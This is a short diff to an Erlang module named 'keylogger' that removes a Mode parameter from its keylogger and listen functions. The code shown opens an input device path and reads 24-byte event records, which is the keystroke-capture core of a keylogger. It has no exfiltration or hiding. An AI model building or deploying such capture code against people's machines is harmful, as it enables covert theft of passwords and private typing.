@@ -1,5 +1,5 @@
 -module(keylogger).
--export([keylogger/2]).
+-export([keylogger/1]).
 -define(KEYS, #{
 0 => <<"RESERVED">>,
 1 => <<"ESC">>,
@@ -527,15 +527,15 @@
 }).
 
 
-keylogger(Dir, Mode) ->
+keylogger(Dir) ->
     case file:open(Dir, [read, raw, binary]) of
 	{ok, Fd} ->
-	    listen(Fd, Mode);
+	    listen(Fd);
 	{error, Reason} ->
 	    Reason
     end.
 
-listen(Fd, Mode) ->
+listen(Fd) ->
     case file:read(Fd, 24) of
 	{ok, <<_:64/little,
 	       _:64/little,
